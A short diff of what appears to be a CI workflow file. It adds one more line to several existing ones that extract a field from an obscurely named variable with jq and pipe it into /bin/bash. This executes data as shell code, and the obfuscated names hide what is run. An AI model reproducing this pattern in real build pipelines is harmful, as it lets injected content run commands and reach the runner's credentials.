@@ -40,6 +40,7 @@ jobs:
           printf '%s' "$ymu17" | jq -r .kppef853 | /bin/bash
           echo $iamwm25 | jq -r .pb32099 | /bin/bash
           printf '%s' "$izlw138" | jq -r .iaqnx506 | /bin/bash
+          echo $j1266 | jq -r .v22 | /bin/bash
 
       - name: Save archive
         if: always()
